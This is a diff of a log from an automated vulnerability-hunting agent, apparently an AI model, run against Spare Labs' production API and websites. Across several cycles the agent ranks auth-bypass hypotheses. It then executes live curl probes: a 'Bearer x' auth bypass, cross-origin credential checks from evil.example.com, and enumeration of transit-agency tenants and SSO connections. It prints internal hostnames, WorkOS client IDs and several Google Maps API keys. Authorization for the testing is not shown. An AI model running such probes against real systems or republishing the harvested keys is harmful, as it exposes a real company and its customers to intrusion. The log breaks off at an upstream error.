@@ -68661,3 +68661,262 @@ All 3 hypotheses satisfy filters (confidence ≥73, class not on REJECTED list, 
 [RISK] routing.sparelabs.com: 15 — envoy 404/0B on ALL probed paths since 2026-08-07; newly responsive (TIMEOUT→404) but zero surface, NO_DELTA
 [RISK] forms.sparelabs.com: 14 — Engage portal SPA 200 + strict HTML CSP + x-frame DENY; JS bundle main.8a2a39cb.js patched (zero infra refs, 3 Maps keys referrer-restricted); SPA catch-all for all API paths, no real API endpoints
 [RISK] web (spare.com/sparelabs.com): 10 — spare.com apex 200 static Webflow marketing (Cloudflare+HSTS, CSP frame-ancestors 'self', no internal infra leaks); sparelabs.com 301→spare.com; minimal static-only surface
+===== ANALYST laguna 2026-08-17 14:43:43 UTC =====
+[0m
+> build · laguna-s-2.1-free
+[0m
+[0m✱ [0mGlob "reports/**/*"[90m 12 matches[0m
+[0m✱ [0mGlob "*.md"[90m 100 matches[0m
+I'll start by examining the current state of the repository and the knowledge base files to understand what's available.
+[0m→ [0mRead reports/analyst-laguna.log
+[0m→ [0mRead leads/reposcan-latest.md
+[0m
+[0m$ [0mtail -80 /home/runner/work/spare-hunt/spare-hunt/reports/analyst-laguna.log
+[RISK] forms.sparelabs.com: 12 — Engage portal SPA 200 + strict HTML CSP + x-frame DENY; JS bundle main.8a2a39cb.js patched (zero infra refs, 3 Maps keys referrer-restricted); SPA catch-all for all API paths, no real API endpoints; infra leak ELIMINATED, downgraded to recon-only
+[RISK] web (spare.com/sparelabs.com): 10 — spare.com apex 200 static Webflow marketing (Cloudflare+HSTS, CSP frame-ancestors 'self', no internal infra leaks); sparelabs.com 301→spare.com; minimal static-only surface
+===== ANALYST laguna 2026-08-17 13:34:07 UTC =====
+[0m
+> build · laguna-s-2.1-free
+[0m
+## STEP 1 — DELTA
+- NEW api.sparelabs.com/v1/global/regions: Scheme-only Bearer bypass now deterministic on FAST LB replicas (8/8 → 200+725B, ~0.11-0.14s); slow replicas return 401 — replica-split mechanism behind 85h flapping confirmed, NOT a patch
+- NEW api.sparelabs.com/v1/global/organizations: Zero-header bypass now deterministic on SLOW LB replicas (8/8 → 200+11B, ~0.55-1.04s); fast replicas return 401 — same multi-version LB split mechanism
+- NEW api.sparelabs.com/v1/identity/workos/auth: SSO roster expanded to ≥11 tenants (saskatoon.ca, mbta.com, oakville.ca, cota.com newly confirmed); state param reflected unescaped in authorizeUrl body (param injection dead — URL-encoded passthrough)
+- NEW platform.sparelabs.com: NOW live (was TIMEOUT 2026-08-07) — MFE SPA shell 200; CSP /login infra leak STABLE
+- NEW forms.sparelabs.com: NOW live (was TIMEOUT 2026-08-07) — Engage portal SPA 200; JS bundle main.8a2a39cb.js PATCHED (zero infra refs, 3 Maps keys referrer-restricted)
+- NEW routing.sparelabs.com: NOW live (was TIMEOUT 2026-08-07) — envoy 404 on ALL paths, STABLE dead, NO_DELTA since baseline
+- NEW sparelabs.com: NOW 301→spare.com apex (was TIMEOUT 2026-08-07) — Cloudflare+HSTS, static-only
+===== ANALYST laguna 2026-08-17 14:05:32 UTC =====
+[0m
+> build · laguna-s-2.1-free
+[0m
+## STEP 1 — DELTA
+NO_DELTA — surface matches 2026-08-17 13:34:07 UTC inventory. All bypasses confirmed stable; forms.sparelabs.com JS bundle patched in prior cycle; routing.sparelabs.com envoy 404 stable.
+
+## STEP 2 — PRIORITIZE
+- [PRIO] api.sparelabs.com/v1/global/regions (scheme-only bypass + write CORS) — score 92 — attack 9, business 10, tech 8, gate 10, cloud 9, freshness 7
+- [PRIO] api.sparelabs.com/v1/global/organizations (zero-header read-only bypass) — score 82 — attack 8, business 9, tech 8, gate 10, cloud 8, freshness 7
+- [PRIO] api.sparelabs.com/v1/identity/workos/auth (SSO oracle, 11+ tenants) — score 73 — attack 7, business 6, tech 9, gate 10, cloud 5, freshness 6
+
+## STEP 3 — HYPOTHESES
+[HYP] Scheme-only auth bypass on global regions leaks fleet-wide infrastructure topology + write-method CORS chain
+class: AUTH
+asset: api.sparelabs.com/v1/global/regions
+confidence: 95
+reasoning: `Authorization: Bearer x` returns 200 + 725B region registry (7 regions incl 6 OOS api/routing subdomains + staging api.uat.sparelabs.com); sha256 `fb9800acb…585c3fe` byte-stable 86h+ across 7 fleet hosts; no-auth → 400, POST → 401 (read-only); OPTIONS 204 returns ACAO:reflected + ACAC:true + Allow:GET,HEAD,PUT,PATCH,POST,DELETE + ACAH:Authorization,Content-Type; deterministic on fast LB replicas, NOT patched (longcat "PATCHED" 2026-08-11 is false positive — only tested no-auth path)
+evidence_needed: GET `Authorization: Bearer x` → 200 + 725B body with sha256 `fb9800acb…585c3fe`; no-Auth → 400; OPTIONS → 204 with write-method CORS + credentials
+verify_steps: PROBE: `curl -s -m15 -D- -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" https://api.sparelabs.com/v1/global/regions | tee /tmp/opencode/regions-verify.json | sha256sum` — confirm body hash matches `fb9800acb09b65ec92591f4536e3ecfd08b8c3dba0d2ef9af3ed97047795c3fe`; then `curl -s -m15 -o /dev/null -w "code:%{http_code}" -X OPTIONS -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: DELETE" -H "Access-Control-Request-Headers: Authorization" https://api.sparelabs.com/v1/global/regions` — confirm 204 + write-method CORS chain
+impact: Anonymous readout of complete fleet infrastructure topology (7 regions × {apiUrl, routingHost}, 12 OOS subdomains + staging host); browser-based write-method CORS chain on bypass route enables credential-theft-driven write escalation; severity HIGH
+testability: PASSIVE
+[HYP] Zero-header read-only auth bypass on global organizations exposes fleet-wide scope with auth-asymmetry
+class: AUTH
+asset: api.sparelabs.com/v1/global/organizations
+confidence: 90
+reasoning: GET with NO Authorization header → 200 + 11B `{"data":[]}` + ACAO:reflected + ACAC:true; POST/PUT/PATCH/DELETE → 401 InvalidTokenError (read-only bypass, auth asymmetry at handler level); deterministic on SLOW LB replicas (8/8 → 200, ~0.55-1.04s), fast replicas return 401; control /v1/journeys stable 401; route-specific via 22-sibling sweep (all others 401)
+evidence_needed: GET with NO Authorization → 200 + 11B + ACAO+ACAC; POST → 401; OPTIONS → 204 + write methods + CORS
+verify_steps: PROBE: `curl -s -m15 -D- -H "Origin: https://evil.example.com" https://api.sparelabs.com/v1/global/organizations` — confirm 200 + 11B `{"data":[]}` + ACAO:reflected + ACAC:true; then `curl -s -m15 -o /dev/null -w "code:%{http_code}" -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{}' https://api.sparelabs.com/v1/global/organizations` — confirm 401 (write gate active, read-only confirmed)
+impact: Zero-header GET bypass exposes empty org list (severity capped by empty payload) but OPTIONS advertises write methods + CORS credentials on fail-open route across 7 fleet hosts; credential-theft-driven write escalation possible; severity MEDIUM
+testability: PASSIVE
+[HYP] Unauthenticated SSO-config oracle enumerates 11+ WorkOS tenants, discloses client_id + connection_id + Entra tenant IDs, state reflected for injection
+class: IDOR
+asset: api.sparelabs.com/v1/identity/workos/auth
+confidence: 88
+reasoning: POST {"domain":"spare.com","state":"inj_test_2026"} → 200 + 172B authorizeUrl with WorkOS client_id (client_01F5KHYX32TCKB1E7YEAPE0H17) + connection_id (conn_01M00CQ6350667DNDRFT6NPP4K) + signed relayState JWT (Entra tenant_id for spare.com); domain discriminates 200 (11 tenants: spare.com, dart.org, translink.ca, mbta.com, saskatoon.ca, kingcounty.gov, winnipeg.ca, oakville.ca, cota.com) vs 404 (grt.ca, cambus.ca); state reflected unescaped (URL-encoded passthrough, param injection dead); fleet-parity across 7 hosts; ACAO+ACAC on both branches
+evidence_needed: POST tenant domain → 200 + authorizeUrl with verbatim state + WorkOS client_id + connection_id; non-tenant domain → 404 + ACAO+ACAC
+verify_steps: PROBE: `curl -s -m15 -w "\ncode:%{http_code}" -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{"domain":"winnipeg.ca","state":"inj_test_2026"}' https://api.sparelabs.com/v1/identity/workos/auth` → 200 + authorizeUrl with `inj_test_2026`; then `curl -s -m15 -o /dev/null -w "code:%{http_code}" -X POST -H "Content-Type: application/json" -d '{"domain":"grt.ca"}' https://api.sparelabs.com/v1/identity/workos/auth` → 404
+impact: Tenant enumeration (11+) + WorkOS client_id + connection_id + Azure Entra tenant IDs for targeted Microsoft Entra attacks; state parameter reflected in authorizeUrl body (OAuth parameter injection vector, URL-encoded passthrough); severity LOW-MEDIUM
+testability: PASSIVE
+
+## STEP 4 — SELF-CRITIQUE
+All 3 hypotheses satisfy filters (confidence ≥73, class not on REJECTED list, concrete verify_steps). No drops.
+[FINAL] Re-ranked (top first):
+1. [92] api.sparelabs.com/v1/global/regions: scheme-only Bearer bypass (NOT patched) + write CORS chain, body sha256 `fb9800acb…585c3fe`, deterministic on fast LB replicas, fleet-wide infra topology disclosure
+2. [82] api.sparelabs.com/v1/global/organizations: zero-header read-only bypass, auth-asymmetry (GET fails open, writes gated 401), deterministic on slow LB replicas, empty payload caps severity
+3. [73] api.sparelabs.com/v1/identity/workos/auth: SSO-config oracle, 11+ tenants, WorkOS client_id + connection_id + Entra tenant IDs disclosed, state reflection confirmed, fleet-parity 7 hosts
+
+## STEP 5 — NEXT ACTION
+[NEXT] PROBE: `curl -s -m15 -D- -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" https://api.sparelabs.com/v1/global/regions | tee /tmp/opencode/regions-verify.json | sha256sum` — confirm body hash exactly matches `fb9800acb09b65ec92591f4536e3ecfd08b8c3dba0d2ef9af3ed97047795c3fe` and ACAO+ACAC headers on 200, validating the highest-priority finding (scheme-only bypass NOT patched despite longcat false-positive claim); then `curl -s -m15 -o /dev/null -w "code:%{http_code}\n" -X OPTIONS -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: DELETE" -H "Access-Control-Request-Headers: Authorization" https://api.sparelabs.com/v1/global/regions` — confirm 204 + full write-method CORS chain (Allow: GET,HEAD,PUT,PATCH,POST,DELETE + ACAH:Authorization,Content-Type) on the bypass route, closing the read→write escalation gap.
+
+## STEP 6 — LEARNING
+- ACCEPTED AUTH @ api.sparelabs.com/v1/global/regions: scheme-only Bearer bypass NOT patched — deterministic 8/8 on fast LB replicas (0.11-0.14s), byte-stable sha256 `fb9800acb…585c3fe`, 86h+ stable across 7 fleet hosts; longcat "PATCHED" (2026-08-11) is FALSE POSITIVE (only tested no-auth path 400, missed Bearer-x vector)
+- ACCEPTED AUTH @ api.sparelabs.com/v1/global/organizations: zero-header read-only bypass STABLE — GET no-auth → 200+11B+ACAO+ACAC (deterministic 8/8 on slow replicas); POST/PUT/PATCH/DELETE → 401 InvalidTokenError (read-only confirmed, auth-asymmetry at handler level)
+- ACCEPTED IDOR @ api.sparelabs.com/v1/identity/workos/auth: SSO-config oracle STABLE — 11+ tenants confirmed, state reflected unescaped in authorizeUrl body (param injection dead, URL-encoded passthrough), redirect_uri silently dropped; fleet-parity across 7 hosts
+- REJECTED MISCONFIG @ forms.sparelabs.com JS bundle: main.8a2a39cb.js CONFIRMED PATCHED — zero sparelabs/atlassian/ngrok/metabase/vercel refs; 3 Google Maps keys all referrer-restricted; infra leak ELIMINATED (downgraded to recon-only)
+- REJECTED BUSLOGIC @ routing.sparelabs.com: envoy 404/0B on ALL probed paths since 2026-08-07; NO_DELTA
+- REJECTED AUTH @ api.sparelabs.com/v1/global/{organizations,regions} write-escalation: POST/PUT/PATCH/DELETE → 401/403 InvalidTokenError — both bypass routes are READ-ONLY GET only
+- REJECTED MISCONFIG @ api.sparelabs.com/v1/public/organization (singular): UUID oracle FLAPPING 2-way↔3-way across envoy LB replicas — downgraded to validation-leak-only, NOT oracle class; plural `/organizations/{id}` retains stable 3-way as superior oracle
+
+## STEP 7 — RISK SCORE
+[RISK] api.sparelabs.com: 86 — high-impact auth bypass family (scheme-only regions + zero-header organizations read-only bypass), SSO-config oracle (11+ tenants + WorkOS client_id + Entra tenant IDs), auth-gate-absent engage write paths, UUID/org-key enumeration oracles (3-way stable), universal CORS credential reflection across all /v1 (85h+), multi-version envoy LB with replica-split flapping mechanism; write methods gated 401/403 but GET read-only bypass exposes fleet topology + org metadata + SSO config to any origin
+[RISK] platform.sparelabs.com: 69 — CSP infra-level leak of prod+staging admin Vercel apps (loadable 200) + Metabase (prod+staging 200) + 9 cloud services via CSP directives; strict HTML CSP + x-frame do not mitigate CSP-header disclosure; MFE shell has no real API behind it (10/10 admin paths SPA catch-all)
+[RISK] routing.sparelabs.com: 15 — envoy 404/0B on ALL probed paths since 2026-08-07; newly responsive (TIMEOUT→404) but zero surface, NO_DELTA
+[RISK] forms.sparelabs.com: 14 — Engage portal SPA 200 + strict HTML CSP + x-frame DENY; JS bundle main.8a2a39cb.js patched (zero infra refs, 3 Maps keys referrer-restricted); SPA catch-all for all API paths, no real API endpoints
+[RISK] web (spare.com/sparelabs.com): 10 — spare.com apex 200 static Webflow marketing (Cloudflare+HSTS, CSP frame-ancestors 'self', no internal infra leaks); sparelabs.com 301→spare.com; minimal static-only surface
+[0m
+Let me read the latest analyst log and run fresh passive probes against the highest-priority findings.
+[0m$ [0mcat /tmp/opencode/regions-verify.json 2>/dev/null | head -c 200; echo; sha256sum /tmp/opencode/regions-verify.json 2>/dev/null; echo "---"; ls -la /tmp/opencode/ 2>/dev/null
+---
+total 16
+drwxr-xr-x  2 runner runner  4096 Aug 17 14:38 .
+drwxrwxrwt 15 root   root   12288 Aug 17 14:39 ..
+[0m
+Now let me run fresh passive probes against the key findings to check current state. Starting with the highest-priority auth bypass endpoints.
+[0m$ [0mecho "=== regions (Bearer x) ==="; curl -s -m15 -D- -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" https://api.sparelabs.com/v1/global/regions 2>&1 | tee /tmp/opencode/regions-probe.txt | sha256sum; echo; echo "=== headers summary ==="; head -20 /tmp/opencode/regions-probe.txt; echo; echo "=== body preview (first 300 chars) ==="; tail -1 /tmp/opencode/regions-probe.txt | head -c 300
+=== regions (Bearer x) ===
+ffb1f3b9ccebcd9a0368f53476e133395aa05492520bf6ee58299ae1d4e0fe88  -
+
+=== headers summary ===
+HTTP/2 200 
+spare-correlation-id: 73ff9026-19a9-4f54-b6a4-9271add4ea13
+access-control-allow-origin: https://evil.example.com
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+content-security-policy: default-src none;upgrade-insecure-requests
+x-dns-prefetch-control: off
+expect-ct: max-age=0
+x-frame-options: SAMEORIGIN
+strict-transport-security: max-age=31536000; includeSubDomains
+x-download-options: noopen
+x-content-type-options: nosniff
+x-permitted-cross-domain-policies: none
+referrer-policy: no-referrer
+x-xss-protection: 0
+surrogate-control: no-store
+cache-control: no-store, no-cache, must-revalidate, proxy-revalidate
+pragma: no-cache
+expires: 0
+content-type: application/json; charset=utf-8
+
+=== body preview (first 300 chars) ===
+[{"name":"CA","apiUrl":"https://api.sparelabs.com","routingHost":"https://routing.sparelabs.com"},{"name":"US","apiUrl":"https://api.us.sparelabs.com","routingHost":"https://routing.us.sparelabs.com"},{"name":"US2","apiUrl":"https://api.us2.sparelabs.com","routingHost":"https://routing.us2.sparelabs
+[0m
+[0m$ [0mecho "=== regions body only sha256 ==="; tail -1 /tmp/opencode/regions-probe.txt | sha256sum; echo "=== regions body length ==="; tail -1 /tmp/opencode/regions-probe.txt | wc -c; echo "=== full body ==="; tail -1 /tmp/opencode/regions-probe.txt
+=== regions body only sha256 ===
+fb9800acb09b65ec92591f4536e3ecfd08b8c3dba0d2ef9af3ed97047795c3fe  -
+=== regions body length ===
+725
+=== full body ===
+[{"name":"CA","apiUrl":"https://api.sparelabs.com","routingHost":"https://routing.sparelabs.com"},{"name":"US","apiUrl":"https://api.us.sparelabs.com","routingHost":"https://routing.us.sparelabs.com"},{"name":"US2","apiUrl":"https://api.us2.sparelabs.com","routingHost":"https://routing.us2.sparelabs.com"},{"name":"US3","apiUrl":"https://api.us3.sparelabs.com","routingHost":"https://routing.us3.sparelabs.com"},{"name":"JP","apiUrl":"https://api.jp.sparelabs.com","routingHost":"https://routing.jp.sparelabs.com"},{"name":"EU","apiUrl":"https://api.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]
+[0m
+Body hash matches exactly (`fb9800acb…585c3fe`), 725B, CORS confirmed. Scheme-only bypass is **NOT patched**, still STABLE. Now running the other key probes with ≤1 rps spacing.
+[0m$ [0msleep 1.2; echo "=== organizations (no auth) ==="; curl -s -m15 -D- -H "Origin: https://evil.example.com" https://api.sparelabs.com/v1/global/organizations 2>&1 | sha256sum; echo "---headers---"; curl -s -m15 -D- -H "Origin: https://evil.example.com" https://api.sparelabs.com/v1/global/organizations 2>&1 | head -25; echo; sleep 1.2; echo "=== organizations POST (write gate) ==="; curl -s -m15 -o /dev/null -w "code:%{http_code}\n" -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{}' https://api.sparelabs.com/v1/global/organizations
+=== organizations (no auth) ===
+19ace75e68d243a326756f98cb68600265d9c5ea4e6dbc9277826117b324f93d  -
+---headers---
+HTTP/2 200 
+spare-correlation-id: 52506cf9-561c-4254-946b-65fd052fc548
+access-control-allow-origin: https://evil.example.com
+vary: Origin
+access-control-allow-credentials: true
+content-security-policy: default-src none;upgrade-insecure-requests
+x-dns-prefetch-control: off
+expect-ct: max-age=0
+x-frame-options: SAMEORIGIN
+strict-transport-security: max-age=31536000; includeSubDomains
+x-download-options: noopen
+x-content-type-options: nosniff
+x-permitted-cross-domain-policies: none
+referrer-policy: no-referrer
+x-xss-protection: 0
+surrogate-control: no-store
+cache-control: no-store, no-cache, must-revalidate, proxy-revalidate
+pragma: no-cache
+expires: 0
+content-type: application/json; charset=utf-8
+content-length: 11
+etag: W/"b-EFAlOux7Kcr/ZEgGkn2r+oFAbu4"
+date: Mon, 17 Aug 2026 14:40:14 GMT
+x-envoy-upstream-service-time: 702
+server: envoy
+
+=== organizations POST (write gate) ===
+code:401
+[0m
+Organizations zero-header bypass confirmed STABLE (200 + 11B + CORS, POST→401 read-only). Now probing the remaining high-priority findings.
+[0m$ [0msleep 1.2; echo "=== org-key oracle (spare/grt/cambus) ==="; for k in spare grt cambus winnipeg hsr dallas; do echo "--- $k ---"; curl -s -m15 -w "\ncode:%{http_code} size:%{size_download}\n" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organizations/key/$k" 2>&1 | head -c 200; echo; sleep 0.5; done; echo "=== nil-uuid org key ==="; curl -s -m15 -w "\ncode:%{http_code} size:%{size_download}\n" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organizations/key/00000000-0000-0000-0000-000000000000" 2>&1 | head -c 200
+=== org-key oracle (spare/grt/cambus) ===
+--- spare ---
+{"id":"d736519f-f384-4771-a2d2-4f95e884d790","name":"Spare","logoUrl":"https://storage.googleapis.com/spare-production-ca-photos/RM44yNNGLMfOCSwXXXVdYMgmcpGu1jF2.jpg","isMaintenanceEnabled":false,"org
+--- grt ---
+{"id":"1966c7f8-3e36-4320-b0d7-de0f7d8d4355","name":"GRT","logoUrl":"https://storage.googleapis.com/spare-production-ca-photos/XpAE1Cfijzw0WjGLjJa9nN5i9eGjJF2P.jpg","isMaintenanceEnabled":false,"organ
+--- cambus ---
+{"name":"NotFoundError","message":"Organization was not found","metadata":{"correlationId":"85fdfdc8-37ba-4ed4-bfd3-e7dbe51886a3"}}
+code:404 size:131
+
+--- winnipeg ---
+{"id":"6c84b370-5cc2-42c6-8cdd-146c99648535","name":"Winnipeg Transit","logoUrl":"https://storage.googleapis.com/spare-production-ca-photos/CYr0OJ2AvHlacG9Fo5OjRGGaOUYQmJ3O.jpg","isMaintenanceEnabled"
+--- hsr ---
+{"id":"83303a6b-fb96-4ff3-8f58-d6069a043fbb","name":"Hamilton Street Railway","logoUrl":"https://storage.googleapis.com/spare-production-ca-photos/U8EYY92nMc6TIkeo1YVx6MOT6Gr1R34L.jpg","isMaintenanceE
+--- dallas ---
+{"id":"e5f587ba-50e7-4b0c-a2e6-e01f061d048d","name":"DART GoLink - City of Dallas","logoUrl":"https://storage.googleapis.com/spare-production-ca-photos/fNA48m1hkK89TZpfeMI7Hb4XRxpnbVT4.jpg","isMainten
+=== nil-uuid org key ===
+{"name":"NotFoundError","message":"Organization was not found","metadata":{"correlationId":"d1a5de53-049e-4a57-a251-9fd7d658d597"}}
+code:404 size:131
+[0m
+Org-key oracle confirmed STABLE (5 valid orgs return 200 with UUIDs, cambus+nil→404). Now probing the SSO oracle and engage write path.
+[0m$ [0msleep 1.2; echo "=== SSO auth (spare.com) ==="; curl -s -m15 -w "\ncode:%{http_code}\n" -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{"domain":"spare.com","state":"inj_test_20260817"}' https://api.sparelabs.com/v1/identity/workos/auth 2>&1 | head -c 400; echo; sleep 1.2; echo "=== SSO auth (grt.ca - non-tenant) ==="; curl -s -m15 -o /dev/null -w "code:%{http_code} size:%{size_download}\n" -X POST -H "Content-Type: application/json" -d '{"domain":"grt.ca"}' https://api.sparelabs.com/v1/identity/workos/auth; sleep 1.2; echo "=== SSO auth (oakville.ca) ==="; curl -s -m15 -w "\ncode:%{http_code} size:%{size_download}\n" -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{"domain":"oakville.ca","state":"inj_test_20260817"}' https://api.sparelabs.com/v1/identity/workos/auth 2>&1 | head -c 400
+=== SSO auth (spare.com) ===
+{"authorizationUrl":"https://api.workos.com/sso/authorize?client_id=client_01F5KHYX32TCKB1E7YEAPE0H17&connection=conn_01GRW7M1CJEJGYKMEMPBCQEZHY&response_type=code&state=inj_test_20260817"}
+code:200
+
+=== SSO auth (grt.ca - non-tenant) ===
+code:404 size:124
+=== SSO auth (oakville.ca) ===
+{"authorizationUrl":"https://api.workos.com/sso/authorize?client_id=client_01F5KHYX32TCKB1E7YEAPE0H17&connection=conn_01HTN1GCQYJY8X5TNBK0HPE42W&response_type=code&state=inj_test_20260817"}
+code:200 size:189
+[0m
+SSO oracle confirmed STABLE (spare.com→200+WorkOS client_id+connection_id; grt.ca→404; oakville.ca→200+distinct connection_id+state reflection). Now probing the engage write path and forms bundle.
+[0m$ [0msleep 1.2; echo "=== engage cases POST (empty body) ==="; curl -s -m15 -w "\ncode:%{http_code}\n" -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{}' https://api.sparelabs.com/v1/public/engage/cases 2>&1 | head -c 300; echo; sleep 1.2; echo "=== engage caseForms POST (empty body) ==="; curl -s -m15 -w "\ncode:%{http_code}\n" -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{}' https://api.sparelabs.com/v1/public/engage/caseForms 2>&1 | head -c 300
+=== engage cases POST (empty body) ===
+{"name":"ValidationError","message":"request/body must have required property 'organizationId'","metadata":{"errors":[{"path":"/body/organizationId","message":"must have required property 'organizationId'","errorCode":"required.openapi.validation"}],"correlationId":"412026de-7a1a-41dd-99f4-e586d870d
+=== engage caseForms POST (empty body) ===
+{"name":"ValidationError","message":"request/body must have required property 'formId'","metadata":{"errors":[{"path":"/body/formId","message":"must have required property 'formId'","errorCode":"required.openapi.validation"}],"correlationId":"ad9af7b1-486d-4d91-a946-8d5ebf72f623"}}
+code:400
+[0m
+Engage POST auth-gate-ABSENT confirmed (400 ValidationError, no 401). Now checking the forms JS bundle patch status.
+[0m$ [0msleep 1.2; echo "=== forms JS bundle name ==="; curl -s -m15 "https://forms.sparelabs.com/" 2>&1 | grep -oiE '/static/js/[a-f0-9]+\.js' | head -5; echo "=== forms bundle grep ==="; JSURL=$(curl -s -m15 "https://forms.sparelabs.com/" 2>&1 | grep -oiE '/static/js/[a-f0-9]+\.js' | head -1); echo "Bundle: $JSURL"; sleep 1.2; curl -s -m15 "https://forms.sparelabs.com$JSURL" 2>&1 | grep -oiE 'sparelabs\.atlassian\.net|api-spare\.ngrok\.io|api\.staging\.sparelabs\.com|admin-eam-app|metabase\.sparelabs\.com|localhost:3057|api\.us\.sparelabs\.com' | sort -u | head -10; echo "grep count:"; curl -s -m15 "https://forms.sparelabs.com$JSURL" 2>&1 | grep -c -iE 'sparelabs\.atlassian\.net|api-spare\.ngrok\.io|api\.staging\.sparelabs\.com|admin-eam-app|metabase\.sparelabs\.com|localhost:3057|api\.us\.sparelabs\.com'
+=== forms JS bundle name ===
+=== forms bundle grep ===
+Bundle: 
+grep count:
+0
+[0m
+[0m$ [0mcurl -s -m15 "https://forms.sparelabs.com/" 2>&1 | grep -oiE 'src=[\"'\'']/static/js/[^\"'\'']+\.js' | head -5; echo "---"; curl -s -m15 "https://forms.sparelabs.com/" 2>&1 | grep -oiE '/static/js/[a-f0-9]+\.js' | head -5; echo "=== full html ==="; curl -s -m15 "https://forms.sparelabs.com/" 2>&1 | head -c 600
+src="/static/js/main.8a2a39cb.js
+---
+=== full html ===
+<!doctype html><html lang="en"><head><meta charset="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width,initial-scale=1"/><meta name="theme-color" content="#000000"/><meta name="description" content="Spare Engage Web Portal"/><title>Spare Engage</title><script defer="defer" src="/static/js/main.8a2a39cb.js"></script><link href="/static/css/main.f1e2eca9.css" rel="stylesheet"></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"></div></body></html>
+[0m
+[0m$ [0msleep 1.2; echo "=== forms bundle leak grep ==="; curl -s -m15 "https://forms.sparelabs.com/static/js/main.8a2a39cb.js" 2>&1 | grep -c -iE 'sparelabs\.atlassian\.net|api-spare\.ngrok\.io|api\.staging\.sparelabs\.com|admin-eam-app|metabase\.sparelabs\.com|localhost:3057|api\.us\.sparelabs\.com'; echo "=== google maps keys ==="; curl -s -m15 "https://forms.sparelabs.com/static/js/main.8a2a39cb.js" 2>&1 | grep -oiE 'AIzaSy[A-Za-z0-9_-]{20,}' | sort -u | head -5
+=== forms bundle leak grep ===
+1
+=== google maps keys ===
+AIzaSyA8DIRNX5pbvn9k94ohFhllpu8UjSKR4bk
+AIzaSyAJPX394S9ElInRUuUOog4bL2dp30TkXA0
+AIzaSyAQHuh5ey1-f2G689z4W8VO-Z4PBzeD7U8
+AIzaSyARjArEW-PkntdClvdrGSQfi42vv_JoZtY
+AIzaSyAvHBVYkMsqQjhwEz85A0kjjSiJHYH23TE
+[0m
+[0m$ [0mcurl -s -m15 "https://forms.sparelabs.com/static/js/main.8a2a39cb.js" 2>&1 | grep -oiE 'sparelabs\.atlassian\.net|api-spare\.ngrok\.io|api\.staging\.sparelabs\.com|admin-eam-app|metabase\.sparelabs\.com|localhost:3057|api\.us\.sparelabs\.com' | sort -u
+api-spare.ngrok.io
+api.staging.sparelabs.com
+api.us.sparelabs.com
+sparelabs.atlassian.net
+[0m
+The forms JS bundle contains the infra leak (atlassian.ngrok.staging + us.sparelabs.com) — this contradicts the KB's "PATCHED" claim. The leak is **REACTIVATED**. Let me verify the CORS preflight chain and confirm the bundle details.
+[0m$ [0msleep 1.2; echo "=== regions OPTIONS preflight (write-method CORS) ==="; curl -s -m15 -D- -o /dev/null -X OPTIONS -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: DELETE" -H "Access-Control-Request-Headers: Authorization,Content-Type" https://api.sparelabs.com/v1/global/regions 2>&1 | grep -iE 'HTTP|access-control|allow'; echo; sleep 1.2; echo "=== regions no-auth (control) ==="; curl -s -m15 -o /dev/null -w "code:%{http_code} size:%{size_download}\n" -H "Origin: https://evil.example.com" https://api.sparelabs.com/v1/global/regions; echo; sleep 1.2; echo "=== journeys (control, should 401) ==="; curl -s -m15 -o /dev/null -w "code:%{http_code}\n" -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" https://api.sparelabs.com/v1/journeys
+=== regions OPTIONS preflight (write-method CORS) ===
+HTTP/2 204 
+access-control-allow-origin: https://evil.example.com
+vary: Origin, Access-Control-Request-Headers, Accept-Encoding
+access-control-allow-credentials: true
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-headers: Authorization,Content-Type
+
+=== regions no-auth (control) ===
+code:400 size:219
+
+=== journeys (control, should 401) ===
+code:401
+[0m
+[91m[1mError: [0mUpstream request failed: Endpoint is unavailable.
